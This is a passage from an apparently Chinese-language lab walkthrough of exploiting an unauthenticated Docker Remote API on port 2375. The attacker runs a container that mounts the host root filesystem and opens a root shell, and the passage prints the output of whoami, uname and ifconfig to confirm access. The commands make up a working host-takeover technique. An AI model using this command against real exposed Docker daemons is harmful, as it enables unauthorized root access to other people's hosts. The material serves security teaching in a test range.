class="dl">"</span><span class="s2">949e6fa</span><span class="dl">"</span><span class="p">},</span><span class="dl">"</span><span class="s2">SecurityOptions</span><span class="dl">"</span><span class="p">:[</span><span class="dl">"</span><span class="s2">name=seccomp,profile=default</span><span class="dl">"</span><span class="p">]}</span>
</code></pre></div></div>
<p>如上，访问info目录返回了关于docker的信息。直接攻击机运行命令：</p>
<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">root</span><span class="p">@</span><span class="nd">shell</span><span class="p">:</span><span class="o">/</span><span class="nx">home</span><span class="o">/</span><span class="nx">tool</span><span class="o">/</span><span class="nx">docker</span><span class="o">/</span><span class="nx">unauth_rce</span><span class="err">#</span> <span class="nx">docker</span> <span class="o">-</span><span class="nx">H</span><span class="o">=</span><span class="nx">tcp</span><span class="p">:</span><span class="c1">//vuln_docker_ip:2375 run -it -v /:/tmp --entrypoint /bin/sh alpine:latest</span>
<span class="o">/</span> <span class="err">#</span> <span class="nx">whoami</span>
<span class="nx">root</span>
<span class="o">/</span> <span class="err">#</span> <span class="nx">uname</span> <span class="o">-</span><span class="nx">a</span>
<span class="nx">Linux</span> <span class="nx">aa5ae15c12f0</span> <span class="mf">3.10</span><span class="p">.</span><span class="mi">0</span><span class="o">-</span><span class="mf">1062.12</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="nx">el7</span><span class="p">.</span><span class="nx">x86_64</span> <span class="err">#</span><span class="mi">1</span> <span class="nx">SMP</span> <span class="nx">Tue</span> <span class="nx">Feb</span> <span class="mi">4</span> <span class="mi">23</span><span class="p">:</span><span class="mi">02</span><span class="p">:</span><span class="mi">59</span> <span class="nx">UTC</span> <span class="mi">2020</span> <span class="nx">x86_64</span> <span class="nx">Linux</span>
<span class="o">/</span> <span class="err">#</span> <span class="nx">ifconfig</span>
<span class="nx">eth0</span>      <span class="nx">Link</span> <span class="nx">encap</span><span class="p">:</span><span class="nx">Ethernet</span>  <span class="nx">HWaddr</span> <span class="mi">02</span><span class="p">:</span><span class="mi">42</span><span class="p">:</span><span class="nx">AC</span><span class="p">:</span><span class="mi">11</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">02</span>
          <span class="nx">inet</span> <span class="nx">addr</span><span class="p">:</span><span class="mf">172.17</span><span class="p">.</span><span class="mf">0.2</span>  <span class="nx">Bcast</span><span class="p">:</span><span class="mf">172.17</span><span class="p">.</span><span class="mf">255.255</span>  <span class="nx">Mask</span><span class="p">:</span><span class="mf">255.255</span><span class="p">.</span><span class="mf">0.0</span>
          <span class="nx">UP</span> <span class="nx">BROADCAST</span> <span class="nx">RUNNING</span> <span class="nx">MULTICAST</span>  <span class="nx">MTU</span><span class="p">:</span><span class="mi">1500</span>  <span class="nx">Metric</span><span class="p">:</span><span class="mi">1</span>
          <span class="nx">RX</span> <span class="nx">packets</span><span class="p">:</span><span class="mi">8</span> <span class="nx">errors</span><span class="p">:</span><span class="mi">0</span> <span class="nx">dropped</span><span class="p">:</span><span class="mi">0</span> <span class="nx">overruns</span><span class="p">:</span><span class="mi">0</span> <span class="nx">frame</span><span class="p">:</span><span class="mi">0</span>
          <span class="nx">TX</span> <span class="nx">packets</span><span class="p">:</span><span class="mi">0</span> <span class="nx">errors</span><span class="p">:</span><span class="mi">0</span> <span class="nx">dropped</span><span class="p">:</span><span class="mi">0</span> <span class="nx">overruns</span><span class="p">:</span><span class="mi">0</span> <span class="nx">carrier</span><span class="p">:</span><span class="mi">0</span>
          <span class="nx">collisions</span><span class="p">:</span><span class="mi">0</span> <span class="nx">txqueuelen</span><span class="p">:</span><span class="mi">0</span>
          <span class="nx">RX</span> <span class="nx">bytes</span><span class="p">:</span><span class="mi">656</span> <span class="p">(</span><span class="mf">656.0</span> <span class="nx">B</span><span class="p">)</span>  <span class="nx">TX</span> <span class="nx">bytes</span><span class="p">:</span><span class="mi">0</span> <span class="p">(</span><span class="mf">0.0</span> <span class="nx">B</span><span class="p">)</span>

<span class="nx">lo</span>        <span class="nx">Link</span> <span class="nx">encap</span><span class="p">:</span><span class="nx">Local</span> <span class="nx">Loopback</span>
          <span class="nx">inet</span> <span class="nx">addr</span><span class="p">:</span><span class="mf">127.0</span><span class="p">.</span><span class="mf">0.1</span>  <span class="nx">Mask</span><span class="p">:</span><span class="mf">255.0</span><span class="p">.</span><span class="mf">0.0</span>
          <span class="nx">UP</span> <span class="nx">LOOPBACK</span> <span class="nx">RUNNING</span>  <span class="nx">MTU</span><span class="p">:</span><span class="mi">65536</span>  <span class="nx">Metric</span><span class="p">:</span><span class="mi">1</span>
          <span class="nx">RX</span> <span class="nx">packets</span><span class="p">:</span><span class="mi">0</span> <span class="nx">errors</span><span class="p">:</span><span class="mi">0</span> <span class="nx">dropped</span><span class="p">:</span><span class="mi">0</span> <span class="nx">overruns</span><span class="p">:</span><span class="mi">0</span> <span class="nx">frame</span><span class="p">:</span><span class="mi">0</span>
          <span class="nx">TX</span> <span class="nx">packets</span><span class="p">:</span><span class="mi">0</span> <span class="nx">errors</span><span class="p">:</span><span class="mi">0</span> <span class="nx">dropped</span><span class="p">:</span><span class="mi">0</span> <span class="nx">overruns</span><span class="p">:</span><span class="mi">0</span> <span class="nx">carrier</span><span class="p">:</span><span class="mi">0</span>
</code></pre></div></div>
<p>震惊有木有，我们可以在靶场上复现，现在在撒旦上、fofa上都很少能找到这种程度的漏洞了；在宿主机上查看docker信息：</p>
<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="nx">root</span><span class="p">@</span><span class="nd">shell</span> <span class="nx">unauthorized</span><span class="o">-</span><span class="nx">rce</span><span class="p">]</span><span class="err">#</span> <span class="nx">bash</span> <span class="o">/</span><span class="nx">home</span><span class="o">/</span><span class="nx">docker_shell_exe</span><span class="p">.</span><span class="nx">sh</span>
<span class="nx">docker0</span>   <span class="nx">Link</span> <span class="nx">encap</span><span class="p">:</span><span class="nx">Ethernet</span>  <span class="nx">HWaddr</span> <span class="mi">02</span><span class="p">:</span><span class="mi">42</span><span class="p">:</span><span class="nx">ED</span><span class="p">:</span><span class="nx">E8</span><span class="p">:</span><span class="mi">4</span><span class="nx">E</span><span class="p">:</span><span class="mi">97</span>
          <span class="nx">inet</span> <span class="nx">addr</span><span class="p">:</span><span class="mf">172.17</span><span class="p">.</span><span class="mf">0.1</span>  <span class="nx">Bcast</span><span class="p">:</span><span class="mf">172.17</span><span class="p">.</span><span class="mf">255.255</span>  <span class="nx">Mask</span><span class="p">:</span><span class="mf">255.255</span><span class="p">.</span><span class="mf">0.0</span>
          <span class="nx">inet6</span> <span class="nx">addr</span><span class="p">:</span> <span class="nx">fe80</span><span class="p">::</span><span class="mi">42</span><span class="p">:</span><span class="nx">edff</span><span class="p">:</span><span class="nx">fee8</span><span class="p">:</span><span class="mi">4</span><span class="nx">e97</span><span class="o">/</span><span class="mi">64</span> <span class="nx">Scope</span><span class="p">:</span><span class="nx">Link</span>
          <span class="nx">UP</span> <span class="nx">BROADCAST</span> <span class="nx">RUNNING</span> <span class="nx">MULTICAST</span>  <span class="nx">MTU</span><span class="p">:</span><span class="mi">1500</span>  <span class="nx">Metric</span><span class="p">:</span><span class="mi">1</span>
          <span class="nx">RX</span> <span class="nx">packets</span><span class="p">:</span><span class="mi">0</span> <span class="nx">errors</span><span class="p">:</span><span class="mi">0</span> <span class="nx">dropped</span><span class="p">:</span><span class="mi">0</span> <span class="nx">overruns</span><span class="p">:</span><span class="mi">0</span> <span class="nx">frame</span><span class="p">:</span><span class="mi">0</span>
          <span class="nx">TX</span> <span class="nx">packets</span><span class="p">:</span><span class="mi">3</span> <span class="nx">errors</span><span class="p">:</span><span class="mi">0</span> <span class="nx">dropped</span><span class="p">:</span><span class="mi">0</span> <span class="nx">overruns</span><span class="p">:</span><span class="mi">0</span> <span class="nx">carrier</span><span class="p">:</span><span class="mi">0</span>
          <span class="nx">collisions</span><span class="p">:</span><span class="mi">0</span> <span class="nx">txqueuelen</span><span class="p">:</span><span class="mi">0</span>
          <span class="nx">RX</span> <span class="nx">bytes</span><span class="p">:</span><span class="mi">0</span> <span class="p">(</span><span class="mf">0.0</span> <span class="nx">B</span><span class="p">)</span>  <span class="nx">TX</span> <span class="nx">bytes</span><span class="p">:</span><span class="mi">266</span> <span class="p">(</span><span class="mf">266.0</span> <span class="nx">B</span><span class="p">)</span>

<span class="nx">eth0</span>      <span class="nx">Link</span> <span class="nx">encap</span><span class="p">:</span><span class="nx">Ethernet</span>  <span class="nx">HWaddr</span> <span class="mi">02</span><span class="p">:</span><span class="mi">42</span><span class="p">:</span><span class="nx">AC</span><span class="p">:</span><span class="mi">14</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">02</span>
          <span class="nx">inet</span> <span class="nx">addr</span><span class="p">:</span><span class="mf">172.20</span><span class="p">.</span><span class="mf">0.2</span>  <span class="nx">Bcast</span><span class="p">:</span><span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span>  <span class="nx">Mask</span><span class="p">:</span><span class="mf">255.255</span><span class="p">.</span><span class="mf">0.0</span>
          <span class="nx">inet6</span> <span class="nx">addr</span><span class="p">:</span> <span class="nx">fe80</span><span class="p">::</span><span class="mi">42</span><span class="p">:</span><span class="nx">acff</span><span class="p">:</span><span class="nx">fe14</span><span class="p">:</span><span class="mi">2</span><span class="o">/</span><span class="mi">64</span> <span class="nx">Scope</span><span class="p">:</span><span class="nx">Link</span>
          <span class="nx">UP</span> <span class="nx">BROADCAST</span> <span class="nx">RUNNING</span> <span class="nx">MULTICAST</span>  <span class="nx">MTU</span><span class="p">:</span><span class="mi">1500</span>  <span class="nx">Metric</span><span class="p">:</span><span class="mi">1</span>
          <span class="nx">RX</span> <span class="nx">packets</span><span class="p">:</span><span class="mi">45363</span> <span class="nx">errors</span><span class="p">:</span><span class="mi">0</span> <span class="nx">dropped</span><span class="p">:</span><span class="mi">0</span> <span class="nx">overruns</span><span class="p">:</span><span class="mi">0</span> <span class="nx">frame</span><span class="p">:</span><span class="mi">0</span>
          <span class="nx">TX</span> <span class="nx">packets</span><span class="p">:</span><span class="mi">41902</span> <span class="nx">errors</span><span class="p">:</span><span class="mi">0</span> <span class="nx">dropped</span><span class="p">:</span><span class="mi">0</span> <span class="nx">overruns</span><span class="p">:</span><span class="mi">0</span> <span class="nx">carrier</span><span class="p">:</span><span class="mi">0</span>
          <span class="nx">collisions</span><span class="p">:</span><span class="mi">0</span> <span class="nx">txqueuelen</span><span class="p">:</span><span class="mi">0</span>
          <span class="nx">RX</span> <span class="nx">bytes</span><span class="p">:</span><span class="mi">10257217</span> <span class="p">(</span><span class="mf">9.7</span> <span class="nx">MiB</span><span class="p">)</span>  <span class="nx">TX</span> <span class="nx">bytes</span><span class="p">:</span><span class="mi">3704534</span> <span class="p">(</span><span class="mf">3.5</span> <span class="nx">MiB</span><span class="p">)</span>

<span class="nx">lo</span>        <span class="nx">Link</span> <span class="nx">encap</span><span class="p">:</span><span class="nx">Local</span> <span class="nx">Loopback</span>
          <span class="nx">inet</span> <span class="nx">addr</span><span class="p">:</span><span class="mf">127.0</span><span class="p">.</span><span class="mf">0.1</span>  <span class="nx">Mask</span><span class="p">:</span><span class="mf">255.0</span><span class="p">.</span><span class="mf">0.0</span>
          <span class="nx">inet6</span> <span class="nx">addr</span><span class="p">:</span> <span class="p">::</span><span class="mi">1</span><span class="o">/</span><span class="mi">128</span> <span class="nx">Scope</span><span class="p">:</span><span class="nx">Host</span>
          <span class="nx">inet6</span> <span class="nx">addr</span><span class="p">:</span> <span class="p">::</span><span class="mi">1</span><span class="o">/</span><span class="mi">128</span> <span class="nx">Scope</span><span class="p">:</span><span class="nx">Host</span>
          <span class="nx">UP</span> <span class="nx">LOOPBACK</span> <span class="nx">RUNNING</span>  <span class="nx">MTU</span><span class="p">:</span><span class="mi">65536</span>  <span class="nx">Metric</span><span class="p">:</span><span class="mi">1</span>
          <span class="nx">RX</span> <span class="nx">packets</span><span class="p">:</span><span class="mi">55</span> <span class="nx">errors</span><span class="p">:</span><span class="mi">0</span> <span class="nx">dropped</span><span class="p">:</span><span class="mi">0</span> <span class="nx">overruns</span><span class="p">:</span><span class="mi">0</span> <span class="nx">frame</span><span class="p">:</span><span class="mi">0</span>
          <span class="nx">TX</span> <span class="nx">packets</span><span class="p">:</span><span class="mi">55</span> <span class="nx">errors</span><span class="p">:</span><span class="mi">0</span> <span class="nx">dropped</span><span class="p">:</span><span class="mi">0</span> <span class="nx">overruns</span><span class="p">:</span><span class="mi">0</span> <span class="nx">carrier</span><span class="p">:</span><span class="mi">0</span>
          <span class="nx">collisions</span><span class="p">:</span><span class="mi">0</span> <span class="nx">txqueuelen</span><span class="p">:</span><span class="mi">1000</span>
          <span class="nx">RX</span> <span class="nx">bytes</span><span class="p">:</span><span class="mi">6487</span> <span class="p">(</span><span class="mf">6.3</span> <span class="nx">KiB</span><span class="p">)</span>  <span class="nx">TX</span> <span class="nx">bytes</span><span class="p">:</span><span class="mi">6487</span> <span class="p">(</span><span class="mf">6.3</span> <span class="nx">KiB</span><span class="p">)</span>
</code></pre></div></div>
<p>返回的信息如上，与我们所使用的靶机机器一致；</p>
